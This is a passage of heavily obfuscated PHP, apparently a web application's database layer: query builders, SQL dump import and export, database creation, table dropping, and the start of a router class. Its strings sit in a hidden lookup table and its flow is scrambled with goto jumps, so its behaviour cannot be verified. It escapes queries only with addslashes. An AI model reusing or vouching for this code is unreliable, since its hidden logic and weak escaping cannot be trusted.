implode($b‹ù¸å±¦•[60], $F¿®Øï•›); } public function insert($D©”šî´Øº, $A«²¡”¡ìø = array(), $cœÈ·”’Öê = false) { goto AõÃÅ‘…Æ; d¥Ø”ô¡±: $FîÁƒé—® .= $this->parseComment(!empty($A«²¡”¡ìø[$cô†ã”ßÒš[361]]) ? $A«²¡”¡ìø[$cô†ã”ßÒš[361]] : $cô†ã”ßÒš[43]); return $this->execute($FîÁƒé—®, $this->parseBind(!empty($A«²¡”¡ìø[$cô†ã”ßÒš[292]]) ? $A«²¡”¡ìø[$cô†ã”ßÒš[292]] : array())); goto Aìß¤²Ø—; A®¦ˆÔ¢Ê: foreach ($D©”šî´Øº as $cì™Ø­ÏÚ¨ => $fò’­ğ¹ëÍ) { if (is_array($fò’­ğ¹ëÍ) && $cô†ã”ßÒš[304] == $fò’­ğ¹ëÍ[0]) { $A±Ø»¢äìÎ[] = $this->parseKey($cì™Ø­ÏÚ¨); $Bô‹¸™ÄÁî[] = $fò’­ğ¹ëÍ[1]; } elseif (is_scalar($fò’­ğ¹ëÍ) || is_null($fò’­ğ¹ëÍ)) { $A±Ø»¢äìÎ[] = $this->parseKey($cì™Ø­ÏÚ¨); $Bô‹¸™ÄÁî[] = $this->parseValue($fò’­ğ¹ëÍ); } } $FîÁƒé—® = ($cœÈ·”’Öê ? $cô†ã”ßÒš[865] : $cô†ã”ßÒš[866]) . $cô†ã”ßÒš[867] . $this->parseTable($A«²¡”¡ìø[$cô†ã”ßÒš[286]]) . $cô†ã”ßÒš[861] . implode($cô†ã”ßÒš[57], $A±Ø»¢äìÎ) . $cô†ã”ßÒš[862] . implode($cô†ã”ßÒš[57], $Bô‹¸™ÄÁî) . $cô†ã”ßÒš[863]; $FîÁƒé—® .= $this->parseLock(isset($A«²¡”¡ìø[$cô†ã”ßÒš[820]]) ? $A«²¡”¡ìø[$cô†ã”ßÒš[820]] : !1); goto d¥Ø”ô¡±; AõÃÅ‘…Æ: $cô†ã”ßÒš =& $_SERVER[£¶ä½¶¢]; $Bô‹¸™ÄÁî = $A±Ø»¢äìÎ = array(); $this->model = $A«²¡”¡ìø[$cô†ã”ßÒš[288]]; goto A®¦ˆÔ¢Ê; Aìß¤²Ø—: } public function selectInsert($f°¡¼…¢°’, $EÂ—¼…Ò, $B’¶Üùˆ–ç = array()) { goto d“ã¯¬êï; d“ã¯¬êï: $c”¢¯¾¾¦® =& $_SERVER[£¶ä½¶¢]; $this->model = $B’¶Üùˆ–ç[$c”¢¯¾¾¦®[288]]; if (is_string($f°¡¼…¢°’)) { $f°¡¼…¢°’ = explode($c”¢¯¾¾¦®[57], $f°¡¼…¢°’); } goto D–šÂŒéø¡; bàÁÌº¤ğ: return $this->execute($bÌÙß¯àÒÏ, $this->parseBind(!empty($B’¶Üùˆ–ç[$c”¢¯¾¾¦®[292]]) ? $B’¶Üùˆ–ç[$c”¢¯¾¾¦®[292]] : array())); goto F³ê´¡ƒ¨å; D–šÂŒéø¡: array_walk($f°¡¼…¢°’, array($this, $c”¢¯¾¾¦®[864])); $bÌÙß¯àÒÏ = $c”¢¯¾¾¦®[995] . $this->parseTable($EÂ—¼…Ò) . $c”¢¯¾¾¦®[861] . implode($c”¢¯¾¾¦®[57], $f°¡¼…¢°’) . $c”¢¯¾¾¦®[973]; $bÌÙß¯àÒÏ .= $this->buildSelectSql($B’¶Üùˆ–ç); goto bàÁÌº¤ğ; F³ê´¡ƒ¨å: } public function update($c‚Äš×ÖÓ¾, $eï½‚Õ¬Ã) { $AÏ•ÆÇÇ„ƒ =& $_SERVER[£¶ä½¶¢]; $this->model = $eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[288]]; $Dğ•‡Û“¨¦ = $AÏ•ÆÇÇ„ƒ[996] . $this->parseTable($eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[286]]) . $this->parseSet($c‚Äš×ÖÓ¾) . $this->parseWhere(!empty($eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[282]]) ? $eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[282]] : $AÏ•ÆÇÇ„ƒ[43]) . $this->parseOrder(!empty($eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[372]]) ? $eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[372]] : $AÏ•ÆÇÇ„ƒ[43]) . $this->parseLimit(!empty($eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[299]]) ? $eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[299]] : $AÏ•ÆÇÇ„ƒ[43]) . $this->parseLock(isset($eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[820]]) ? $eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[820]] : !1) . $this->parseComment(!empty($eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[361]]) ? $eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[361]] : $AÏ•ÆÇÇ„ƒ[43]); return $this->execute($Dğ•‡Û“¨¦, $this->parseBind(!empty($eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[292]]) ? $eï½‚Õ¬Ã[$AÏ•ÆÇÇ„ƒ[292]] : array())); } public function delete($fíÅÖ•éÈÉ = array()) { $E†“¶šÄƒ =& $_SERVER[£¶ä½¶¢]; $this->model = $fíÅÖ•éÈÉ[$E†“¶šÄƒ[288]]; $DŠ…®²Äå¹ = $E†“¶šÄƒ[997] . $this->parseTable($fíÅÖ•éÈÉ[$E†“¶šÄƒ[286]]) . $this->parseWhere(!empty($fíÅÖ•éÈÉ[$E†“¶šÄƒ[282]]) ? $fíÅÖ•éÈÉ[$E†“¶šÄƒ[282]] : $E†“¶šÄƒ[43]) . $this->parseOrder(!empty($fíÅÖ•éÈÉ[$E†“¶šÄƒ[372]]) ? $fíÅÖ•éÈÉ[$E†“¶šÄƒ[372]] : $E†“¶šÄƒ[43]) . $this->parseLimit(!empty($fíÅÖ•éÈÉ[$E†“¶šÄƒ[299]]) ? $fíÅÖ•éÈÉ[$E†“¶šÄƒ[299]] : $E†“¶šÄƒ[43]) . $this->parseLock(isset($fíÅÖ•éÈÉ[$E†“¶šÄƒ[820]]) ? $fíÅÖ•éÈÉ[$E†“¶šÄƒ[820]] : !1) . $this->parseComment(!empty($fíÅÖ•éÈÉ[$E†“¶šÄƒ[361]]) ? $fíÅÖ•éÈÉ[$E†“¶šÄƒ[361]] : $E†“¶šÄƒ[43]); return $this->execute($DŠ…®²Äå¹, $this->parseBind(!empty($fíÅÖ•éÈÉ[$E†“¶šÄƒ[292]]) ? $fíÅÖ•éÈÉ[$E†“¶šÄƒ[292]] : array())); } public function select($A”ª”¨²Õ¢ = array()) { goto F‡ÏŸ‘; d‹í†ƒ¸Àø: if ($D´·†óÛá÷ && !1 !== $CòÅãÏù–º) { think_cache($cä‡ìƒˆò™, $CòÅãÏù–º, $D´·†óÛá÷); } return $CòÅãÏù–º; goto CõÙ§–ï ğ; F‡ÏŸ‘: $D‰µ²ÉÄË =& $_SERVER[£¶ä½¶¢]; $this->model = $A”ª”¨²Õ¢[$D‰µ²ÉÄË[288]]; $F±îÜ‹Æ„Ä = $this->buildSelectSql($A”ª”¨²Õ¢); goto c’¢ˆ®ñ; c’¢ˆ®ñ: $D´·†óÛá÷ = isset($A”ª”¨²Õ¢[$D‰µ²ÉÄË[356]]) ? $A”ª”¨²Õ¢[$D‰µ²ÉÄË[356]] : !1; if ($D´·†óÛá÷) { $cä‡ìƒˆò™ = is_string($D´·†óÛá÷[$D‰µ²ÉÄË[103]]) ? $D´·†óÛá÷[$D‰µ²ÉÄË[103]] : $D‰µ²ÉÄË[998] . md5($F±îÜ‹Æ„Ä); $a…Ÿ˜éÖ•£ = think_cache($cä‡ìƒˆò™, $D‰µ²ÉÄË[43], $D´·†óÛá÷); if (!1 !== $a…Ÿ˜éÖ•£) { return $a…Ÿ˜éÖ•£; } } $CòÅãÏù–º = $this->query($F±îÜ‹Æ„Ä, $this->parseBind(!empty($A”ª”¨²Õ¢[$D‰µ²ÉÄË[292]]) ? $A”ª”¨²Õ¢[$D‰µ²ÉÄË[292]] : array())); goto d‹í†ƒ¸Àø; CõÙ§–ï ğ: } public function buildSelectSql($dê¹½É¹æ» = array()) { goto DõäŒİñáƒ; fĞÂµĞÎ™: return $fº©»å¶; goto B‘©÷ÇÖÆç; DõäŒİñáƒ: $e¹„„ˆ·ò’ =& $_SERVER[£¶ä½¶¢]; if (isset($dê¹½É¹æ»[$e¹„„ˆ·ò’[360]])) { if (strpos($dê¹½É¹æ»[$e¹„„ˆ·ò’[360]], $e¹„„ˆ·ò’[57])) { list($cÔ«ºÓí·, $c°ßÚ†šÀ) = explode($e¹„„ˆ·ò’[57], $dê¹½É¹æ»[$e¹„„ˆ·ò’[360]]); } else { $cÔ«ºÓí· = $dê¹½É¹æ»[$e¹„„ˆ·ò’[360]]; } $cÔ«ºÓí· = $cÔ«ºÓí· ? $cÔ«ºÓí· : 1; $c°ßÚ†šÀ = isset($c°ßÚ†šÀ) ? $c°ßÚ†šÀ : (is_numeric($dê¹½É¹æ»[$e¹„„ˆ·ò’[299]]) ? $dê¹½É¹æ»[$e¹„„ˆ·ò’[299]] : 20); $eøïªÔã÷Ù = $c°ßÚ†šÀ * ((int) $cÔ«ºÓí· - 1); $dê¹½É¹æ»[$e¹„„ˆ·ò’[299]] = $eøïªÔã÷Ù . $e¹„„ˆ·ò’[57] . $c°ßÚ†šÀ; } if (think_config($e¹„„ˆ·ò’[999])) { $bïİÁ½µ¦Ö = $e¹„„ˆ·ò’[1000] . md5(serialize($dê¹½É¹æ»)); $EŞ‰îñ•Ä = think_cache($bïİÁ½µ¦Ö); if ($EŞ‰îñ•Ä) { return $EŞ‰îñ•Ä; } } goto eÆ¬øŞÄÑÍ; eÆ¬øŞÄÑÍ: $fº©»å¶ = $this->parseSql($this->selectSql, $dê¹½É¹æ»); $fº©»å¶ .= $this->parseLock(isset($dê¹½É¹æ»[$e¹„„ˆ·ò’[820]]) ? $dê¹½É¹æ»[$e¹„„ˆ·ò’[820]] : !1); if (isset($bïİÁ½µ¦Ö)) { think_cache($bïİÁ½µ¦Ö, $fº©»å¶); } goto fĞÂµĞÎ™; B‘©÷ÇÖÆç: } public function parseSql($e‰‚‹èî½–, $dˆö›¨ùÕ = array()) { $Bõ²°«öô… =& $_SERVER[£¶ä½¶¢]; $e‰‚‹èî½– = str_replace(array($Bõ²°«öô…[1001], $Bõ²°«öô…[1002], $Bõ²°«öô…[1003], $Bõ²°«öô…[1004], $Bõ²°«öô…[1005], $Bõ²°«öô…[1006], $Bõ²°«öô…[1007], $Bõ²°«öô…[1008], $Bõ²°«öô…[1009], $Bõ²°«öô…[1010], $Bõ²°«öô…[1011]), array($this->parseTable("{$dˆö›¨ùÕ[$Bõ²°«öô…[286]]}"), $this->parseDistinct(isset($dˆö›¨ùÕ[$Bõ²°«öô…[1012]]) ? $dˆö›¨ùÕ[$Bõ²°«öô…[1012]] : !1), $this->parseField(!empty($dˆö›¨ùÕ[$Bõ²°«öô…[280]]) ? $dˆö›¨ùÕ[$Bõ²°«öô…[280]] : $Bõ²°«öô…[192]), $this->parseJoin(!empty($dˆö›¨ùÕ[$Bõ²°«öô…[289]]) ? $dˆö›¨ùÕ[$Bõ²°«öô…[289]] : $Bõ²°«öô…[43]), $this->parseWhere(!empty($dˆö›¨ùÕ[$Bõ²°«öô…[282]]) ? $dˆö›¨ùÕ[$Bõ²°«öô…[282]] : $Bõ²°«öô…[43]), $this->parseGroup(!empty($dˆö›¨ùÕ[$Bõ²°«öô…[1013]]) ? $dˆö›¨ùÕ[$Bõ²°«öô…[1013]] : $Bõ²°«öô…[43]), $this->parseHaving(!empty($dˆö›¨ùÕ[$Bõ²°«öô…[1014]]) ? $dˆö›¨ùÕ[$Bõ²°«öô…[1014]] : $Bõ²°«öô…[43]), $this->parseOrder(!empty($dˆö›¨ùÕ[$Bõ²°«öô…[372]]) ? $dˆö›¨ùÕ[$Bõ²°«öô…[372]] : $Bõ²°«öô…[43]), $this->parseLimit(!empty($dˆö›¨ùÕ[$Bõ²°«öô…[299]]) ? $dˆö›¨ùÕ[$Bõ²°«öô…[299]] : $Bõ²°«öô…[43]), $this->parseUnion(!empty($dˆö›¨ùÕ[$Bõ²°«öô…[354]]) ? $dˆö›¨ùÕ[$Bõ²°«öô…[354]] : $Bõ²°«öô…[43]), $this->parseComment(!empty($dˆö›¨ùÕ[$Bõ²°«öô…[361]]) ? $dˆö›¨ùÕ[$Bõ²°«öô…[361]] : $Bõ²°«öô…[43])), $e‰‚‹èî½–); return $e‰‚‹èî½–; } public function getLastSql($DÃ”àÑ¥Í° = '') { return $DÃ”àÑ¥Í° ? $this->modelSql[$DÃ”àÑ¥Í°] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($c¹Ş‡á”Òö) { return addslashes($c¹Ş‡á”Òö); } public function setModel($D‚÷±Ë‹“˜) { $this->model = $D‚÷±Ë‹“˜; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($e¼¨Ö¼´Òâ, $FÕš­Ööñ = '') { $this->database = $e¼¨Ö¼´Òâ; $this->type = $FÕš­Ööñ; } public function model($f¼Æ¥éÂ‡¸ = '') { return new ModelBase($f¼Æ¥éÂ‡¸, $_SERVER[£¶ä½¶¢][43], $this->database); } public function db($DŸ…Ôªìİ¨ = false) { goto AÊÑíŒê¢´; AÊÑíŒê¢´: $BšİÑìƒŒ =& $_SERVER[£¶ä½¶¢]; $fí‹Æ ç¨ = array_change_key_case($this->database); if ($this->type == $BšİÑìƒŒ[19] || !$DŸ…Ôªìİ¨) { return $this->model()->db(); } goto A­ê­ÂÔ; BèÄ°¹¬êƒ: $this->database = $fí‹Æ ç¨; $c·ŸÀ¦Ã‹ö->execute("\x75\163\145\40\140{$c„½³”‰}\140"); return $c·ŸÀ¦Ã‹ö; goto cÁºÈÍ÷ñÈ; DÁ—øÎªÄ‰: $this->database = $fí‹Æ ç¨; $c·ŸÀ¦Ã‹ö = $this->model()->db(); try { $D½‰ÚøÂ‚ = $c·ŸÀ¦Ã‹ö->execute("\163\150\157\167\40\144\141\x74\141\x62\141\x73\145\x73\x20\x6c\x69\153\145\40\x27{$c„½³”‰}\47"); } catch (Exception $Dá§Â¾î°ª) { } goto E‹Šî¡÷ÂŸ; E‹Šî¡÷ÂŸ: if (!$D½‰ÚøÂ‚) { $c·ŸÀ¦Ã‹ö->execute("\x63\162\145\141\164\145\x20\144\x61\x74\x61\x62\x61\x73\x65\x20\x60{$c„½³”‰}\140"); } $fí‹Æ ç¨[$BšİÑìƒŒ[927]] = $c„½³”‰; if ($fí‹Æ ç¨[$BšİÑìƒŒ[762]] == $BšİÑìƒŒ[763]) { $fí‹Æ ç¨[$BšİÑìƒŒ[764]] .= $BšİÑìƒŒ[1015] . $c„½³”‰; } goto BèÄ°¹¬êƒ; A­ê­ÂÔ: $c„½³”‰ = $fí‹Æ ç¨[$BšİÑìƒŒ[927]]; $fí‹Æ ç¨[$BšİÑìƒŒ[927]] = $BšİÑìƒŒ[43]; if ($fí‹Æ ç¨[$BšİÑìƒŒ[762]] == $BšİÑìƒŒ[763]) { $D‚á“’ÁÈ = $fí‹Æ ç¨[$BšİÑìƒŒ[764]]; $fí‹Æ ç¨[$BšİÑìƒŒ[764]] = substr($D‚á“’ÁÈ, 0, strrpos($D‚á“’ÁÈ, $BšİÑìƒŒ[1015])); } goto DÁ—øÎªÄ‰; cÁºÈÍ÷ñÈ: } public function createTable($b›Â¬Ñ˜¦Á, $eÏğÁ®ÁÕ• = null) { $a—×Í©ÈÀ =& $_SERVER[£¶ä½¶¢]; if (!IO::exist($b›Â¬Ñ˜¦Á)) { ActionCall($a—×Í©ÈÀ[1016], !0, 0); show_json(LNG($a—×Í©ÈÀ[1017]), !1); } $Eğƒ¹Íâ’« = sqlSplit(IO::getContent($b›Â¬Ñ˜¦Á)); foreach ($Eğƒ¹Íâ’« as $e„ƒ í½Ø) { if ($eÏğÁ®ÁÕ•) { $C°®¦”¹ò = stripos($e„ƒ í½Ø, $a—×Í©ÈÀ[1018]) === 0; if ($C°®¦”¹ò) { $eÏğÁ®ÁÕ•->task[$a—×Í©ÈÀ[1019]] += 1; } } $this->model()->db()->execute($e„ƒ í½Ø); if ($eÏğÁ®ÁÕ• && $C°®¦”¹ò) { preg_match($a—×Í©ÈÀ[1020], $e„ƒ í½Ø, $fáô‰Ê¡·‹); $eÏğÁ®ÁÕ•->task[$a—×Í©ÈÀ[1021]] = $fáô‰Ê¡·‹[1]; $eÏğÁ®ÁÕ•->update(1); } } $this->taskToCache($eÏğÁ®ÁÕ•); } public function insertTable($díÓÇ…’‚ç, $dÄƒë¸Ôã = null) { $fêŸ–…æÁ =& $_SERVER[£¶ä½¶¢]; $e™ƒíòšË‡ = $this->model()->db(); $f£–•¼×ø› = $DÅØ½Õœ³• ? array($DÅØ½Õœ³•) : $e™ƒíòšË‡->getTables(); foreach ($díÓÇ…’‚ç as $D İŸØÍè) { $DÅØ½Õœ³• = basename($D İŸØÍè, $fêŸ–…æÁ[754]); if (!in_array($DÅØ½Õœ³•, $f£–•¼×ø›)) { continue; } if ($dÄƒë¸Ôã) { $dÄƒë¸Ôã->task[$fêŸ–…æÁ[1021]] = $DÅØ½Õœ³•; } if (get_filesize($D İŸØÍè) == 0) { continue; } $bâæá¼Ë°ò = $this->sqlToDb($D İŸØÍè, $dÄƒë¸Ôã); if (!$bâæá¼Ë°ò) { ActionCall($fêŸ–…æÁ[1016], !0, 0); show_json(LNG($fêŸ–…æÁ[1022]) . "\133{$DÅØ½Õœ³•}\135", !1); } } $this->taskToCache($dÄƒë¸Ôã); } public function sqlFromDb($FİÏæË¨Ö, $a–ÎÈŸ¨‘, $EøÜÉâöè¦ = null, $eÂ¢ê³õŒ£ = null) { goto f‹Å¼”Ç‚ø; c‰¼°‡»›Ğ: $C¾“¾Ü¸ƒ³ = $aïÏ‚î·³†->getPk(); $bš„Ï³Şõš = $aïÏ‚î·³†->getDbFields(); do { $eÎËĞéÉôÖ = array($C¾“¾Ü¸ƒ³ => array($_SERVER[£¶ä½¶¢][969], $F©Ò°Ö„í‚)); $A¤åËóöÔÀ = $aïÏ‚î·³†->where($eÎËĞéÉôÖ)->field($bš„Ï³Şõš)->order($C¾“¾Ü¸ƒ³ . $_SERVER[£¶ä½¶¢][1024])->limit($A°ìŠğĞŒ)->select(); $A¤åËóöÔÀ = !empty($A¤åËóöÔÀ) ? $A¤åËóöÔÀ : array(); if (!($DÉãªŒÅå´ = count($A¤åËóöÔÀ))) { break; } $C¯“Í™«‚¯ = end($A¤åËóöÔÀ); $F©Ò°Ö„í‚ = $C¯“Í™«‚¯[$C¾“¾Ü¸ƒ³]; $f¡Îèàù‰ = array(); foreach ($A¤åËóöÔÀ as $eÑ“–‰©¨) { if ($FİÏæË¨Ö == $_SERVER[£¶ä½¶¢][1025] && $eÑ“–‰©¨[$_SERVER[£¶ä½¶¢][39]] == $_SERVER[£¶ä½¶¢][1026]) { $Cò¸Õ½ùö· = json_decode($eÑ“–‰©¨[$_SERVER[£¶ä½¶¢][381]], !0); if ($Cò¸Õ½ùö·[$_SERVER[£¶ä½¶¢][38]] == date($_SERVER[£¶ä½¶¢][719]) && !$Cò¸Õ½ùö·[$_SERVER[£¶ä½¶¢][718]]) { continue; } } if ($eÂ¢ê³õŒ£) { $eÑ“–‰©¨[$_SERVER[£¶ä½¶¢][86]] = "\173\x69\x6f\x3a{$eÂ¢ê³õŒ£}\x7d" . substr($eÑ“–‰©¨[$_SERVER[£¶ä½¶¢][86]], strlen("\173\x69\157\x3a{$eÑ“–‰©¨[$_SERVER[£¶ä½¶¢][790]]}\175")); $eÑ“–‰©¨[$_SERVER[£¶ä½¶¢][790]] = $eÂ¢ê³õŒ£; } $f¡Îèàù‰[] = $_SERVER[£¶ä½¶¢][1027] . $this->sqlEncode($eÑ“–‰©¨) . $_SERVER[£¶ä½¶¢][1028]; } $Dç°å‹÷¸Û = "\111\x4e\x53\x45\122\x54\40\111\116\x54\117\x20\x60{$FİÏæË¨Ö}\x60\x20\x28\x60" . implode($_SERVER[£¶ä½¶¢][1029], $bš„Ï³Şõš) . $_SERVER[£¶ä½¶¢][1030]; fwrite($c®³ÁâÅ¬, $Dç°å‹÷¸Û . implode($_SERVER[£¶ä½¶¢][1031], $f¡Îèàù‰) . $_SERVER[£¶ä½¶¢][78] . PHP_EOL); $EÛøìå¼­• += $DÉãªŒÅå´; if ($EøÜÉâöè¦) { $EøÜÉâöè¦->update($DÉãªŒÅå´); } } while ($A°ìŠğĞŒ == $DÉãªŒÅå´); goto aİ¥åÈƒì; f‹Å¼”Ç‚ø: if ($EøÜÉâöè¦) { $EøÜÉâöè¦->task[$_SERVER[£¶ä½¶¢][1021]] = $FİÏæË¨Ö; } $aïÏ‚î·³† = $this->model($FİÏæË¨Ö); $EÛøìå¼­• = 0; goto cï©ºÂ¾ÂÛ; cï©ºÂ¾ÂÛ: $F©Ò°Ö„í‚ = 0; $A°ìŠğĞŒ = 10000; $c®³ÁâÅ¬ = fopen($a–ÎÈŸ¨‘, $_SERVER[£¶ä½¶¢][1023]); goto c‰¼°‡»›Ğ; aİ¥åÈƒì: fclose($c®³ÁâÅ¬); return $EÛøìå¼­•; goto eéóêî•Åµ; eéóêî•Åµ: } public function sqlToDb($a©ÈóÇê¸ò, $D¬Å”ùŸ = null) { goto a×íÛàÓœ; Cã£Ç©—²Å: if (!$dîÕŸ¬‘“¾) { return !1; } $F…­Œà«æ = 0; $CêĞŒ’¯Ïƒ = $B—Í×¥Í¶Â[43]; goto C·¥Ÿ™…ÚŸ; a×íÛàÓœ: $B—Í×¥Í¶Â =& $_SERVER[£¶ä½¶¢]; $E°¼é‰÷ª– = $this->model()->db(); $dîÕŸ¬‘“¾ = @fopen($a©ÈóÇê¸ò, $B—Í×¥Í¶Â[1032]); goto Cã£Ç©—²Å; aæ„Ó£ºÓ: if ($F«µµÆ‰ë == $B—Í×¥Í¶Â[1033]) { $fË±ÙôÚµ® = 50; } while (!feof($dîÕŸ¬‘“¾)) { $A³ÜÁçì = trim(fgets($dîÕŸ¬‘“¾)); if (!$A³ÜÁçì) { continue; } $CñŸºÄÁ”ë = $this->sqlDecode($A³ÜÁçì, $this->type); if (stripos($CñŸºÄÁ”ë, $B—Í×¥Í¶Â[364]) === 0) { if (!$CêĞŒ’¯Ïƒ) { $CêĞŒ’¯Ïƒ = $CñŸºÄÁ”ë . $B—Í×¥Í¶Â[60]; } continue; } if ($D¬Å”ùŸ) { $D¬Å”ùŸ->task[$B—Í×¥Í¶Â[1019]] += 1; } $F…­Œà«æ++; $d²Œù½Á¹[] = rtrim(rtrim(trim($CñŸºÄÁ”ë), $B—Í×¥Í¶Â[57]), $B—Í×¥Í¶Â[78]); if ($F…­Œà«æ >= $fË±ÙôÚµ®) { $CñŸºÄÁ”ë = $CêĞŒ’¯Ïƒ . implode($B—Í×¥Í¶Â[57], $d²Œù½Á¹); if (!$E°¼é‰÷ª–->execute($CñŸºÄÁ”ë)) { return !1; } if ($D¬Å”ùŸ) { $D¬Å”ùŸ->update($F…­Œà«æ); } $d²Œù½Á¹ = array(); $F…­Œà«æ = 0; } } fclose($dîÕŸ¬‘“¾); goto fÍ…Â–Ñ¼; fÍ…Â–Ñ¼: if (!empty($d²Œù½Á¹)) { $CñŸºÄÁ”ë = $CêĞŒ’¯Ïƒ . implode($B—Í×¥Í¶Â[57], $d²Œù½Á¹); if (!$E°¼é‰÷ª–->execute($CñŸºÄÁ”ë)) { return !1; } if ($D¬Å”ùŸ) { $D¬Å”ùŸ->update($F…­Œà«æ); } } return !0; goto CÍ¼‰áÊŞ; C·¥Ÿ™…ÚŸ: $d²Œù½Á¹ = array(); $fË±ÙôÚµ® = $this->type == $B—Í×¥Í¶Â[19] ? 500 : 2000; $F«µµÆ‰ë = basename($a©ÈóÇê¸ò, $B—Í×¥Í¶Â[754]); goto aæ„Ó£ºÓ; CÍ¼‰áÊŞ: } public function dropTable($FŠ‡Ğ·‹ºÓ = null) { $C¦”Ù¾×›‹ = $this->model()->db(); $eØåóµƒ = $FŠ‡Ğ·‹ºÓ ? array($FŠ‡Ğ·‹ºÓ) : $C¦”Ù¾×›‹->getTables(); if (!$eØåóµƒ) { return; } foreach ($eØåóµƒ as $FŠ‡Ğ·‹ºÓ) { $C¦”Ù¾×›‹->execute("\144\162\157\160\40\x74\x61\x62\x6c\x65\x20\151\146\40\x65\170\x69\x73\x74\163\40\x60{$FŠ‡Ğ·‹ºÓ}\x60"); } } private function taskToCache($aÆ¶Š»ß = null) { $aÊë„ÌÄë¿ =& $_SERVER[£¶ä½¶¢]; if (!$aÆ¶Š»ß) { return; } $b¥Œ¼’™àé = array($aÊë„ÌÄë¿[1021] => $aÆ¶Š»ß->task[$aÊë„ÌÄë¿[1021]], $aÊë„ÌÄë¿[1019] => $aÆ¶Š»ß->task[$aÊë„ÌÄë¿[1019]], $aÊë„ÌÄë¿[1034] => $aÆ¶Š»ß->task[$aÊë„ÌÄë¿[1034]]); if ($b¥Œ¼’™àé[$aÊë„ÌÄë¿[1019]] == $b¥Œ¼’™àé[$aÊë„ÌÄë¿[1034]]) { $b¥Œ¼’™àé[$aÊë„ÌÄë¿[728]] = 1; } Cache::set($aÊë„ÌÄë¿[1035] . $aÆ¶Š»ß->task[$aÊë„ÌÄë¿[401]], $b¥Œ¼’™àé); $aÆ¶Š»ß->end(); } private function sqlEncode($AÂ¼İ¼¶¾Ö) { $b²ƒóè³Á“ =& $_SERVER[£¶ä½¶¢]; $DÏ’ÅÓ¡” = array(); foreach ($AÂ¼İ¼¶¾Ö as $d°î¦†êŞÛ) { if (is_array($d°î¦†êŞÛ)) { $d°î¦†êŞÛ = json_encode_force($d°î¦†êŞÛ); } $d°î¦†êŞÛ = addslashes($d°î¦†êŞÛ); $d°î¦†êŞÛ = str_replace(array($b²ƒóè³Á“[1036], $b²ƒóè³Á“[9]), array($b²ƒóè³Á“[1037], $b²ƒóè³Á“[1038]), $d°î¦†êŞÛ); $DÏ’ÅÓ¡”[] = str_replace($b²ƒóè³Á“[65], $b²ƒóè³Á“[1039], $d°î¦†êŞÛ); } return $b²ƒóè³Á“[65] . implode($b²ƒóè³Á“[1040], $DÏ’ÅÓ¡”) . $b²ƒóè³Á“[65]; } private function sqlDecode($Aœ‰º”†ù•, $a”İø©Œâé) { $Bğ¬«­˜² =& $_SERVER[£¶ä½¶¢]; $Aœ‰º”†ù• = str_replace(array($Bğ¬«­˜²[1037], $Bğ¬«­˜²[1038]), array($Bğ¬«­˜²[1036], $Bğ¬«­˜²[9]), $Aœ‰º”†ù•); if ($a”İø©Œâé == $Bğ¬«­˜²[19]) { $Aœ‰º”†ù• = stripslashes($Aœ‰º”†ù•); } return $Aœ‰º”†ù•; } } goto F¬¼¹Œä£»; A¥‹¡¤®­Ä: class Application { private $defaultModule = "\x69\x6e\144\145\170"; private $defaultController = "\x69\x6e\144\145\x78"; private $defaultAction = "\x69\156\144\x65\170"; function __construct() { } public function setDefault($eˆ„’ë‚¨) { goto bØê‹÷µ»; E¬òŒ„‚­”: $AõÎ‰È³ã© = $f­ƒ‘Ã·âÙ[589]; while ($AõÎ‰È³ã© < $f­ƒ‘Ã·âÙ[586]) { if ($AõÎ‰È³ã© >= 0) { break; } $AõÎ‰È³ã©++; } goto c¶†„Ş·„; A®É…Ç——: $aİõŒ“Ò¼„ = $f­ƒ‘Ã·âÙ[588]; $this->defaultAction = $eÕ¶Ê˜È©[2] ? $eÕ¶Ê˜È©[2] : $this->defaultAction; $this->{$_SERVER[£ÛúôÆ˜öÒòş][3]}($BÙÆÄ‚áµŠ[4], array($this, $BÙÆÄ‚áµŠ[5])); goto E¬òŒ„‚­”; bó¸óêÔŞ£: $this->defaultModule = $eÕ¶Ê˜È©[0] ? $eÕ¶Ê˜È©[0] : $this->defaultModule; $cÁ¸×¤ğ¹° = $f­ƒ‘Ã·âÙ[587]; $this->defaultController = $eÕ¶Ê˜È©[1] ? $eÕ¶Ê˜È©[1] : $this->defaultController; goto A®É…Ç——; bØê‹÷µ»: $f­ƒ‘Ã·âÙ =& $_SERVER[£¶ä½¶¢]; $BÙÆÄ‚áµŠ =& $_SERVER[£ÛúôÆ˜öÒòş]; $eÕ¶Ê˜È© = $BÙÆÄ‚áµŠ[0]($BÙÆÄ‚áµŠ[1], $BÙÆÄ‚áµŠ[2]($eˆ„’ë‚¨, $BÙÆÄ‚áµŠ[1])); goto bó¸óêÔŞ£; c¶†„Ş·„: } public function appRun($cÀìÁÊÌË×) { goto eÈĞĞ§Ò¤Â; B©¯¤ƒ¥×‰: $f°‚÷ƒïóÄ = $DîØ ¨‚‘[7]; $e¼´øà·“© = $_SERVER[£¶ä½¶¢][590]; if ($D ¡¬§«”İ == $DîØ ¨‚‘[8]) { $f°‚÷ƒïóÄ = $DîØ ¨‚‘[9]; $B‘ŠÑƒ¼İï[0] = $DîØ ¨‚‘[10]; $B‘ŠÑƒ¼İï[1] = $B‘ŠÑƒ¼İï[1] . $DîØ ¨‚‘[11]; $cÀìÁÊÌË× = $DîØ ¨‚‘[12]($DîØ ¨‚‘[1], $B‘ŠÑƒ¼İï); $cÀìÁÊÌË× = $DîØ ¨‚‘[2]($cÀìÁÊÌË×, $DîØ ¨‚‘[1]); } goto fé»äõ«Ö¿; eÈĞĞ§Ò¤Â: $DîØ ¨‚‘ =& $_SERVER[£ÛúôÆ˜öÒòş]; $B‘ŠÑƒ¼İï = 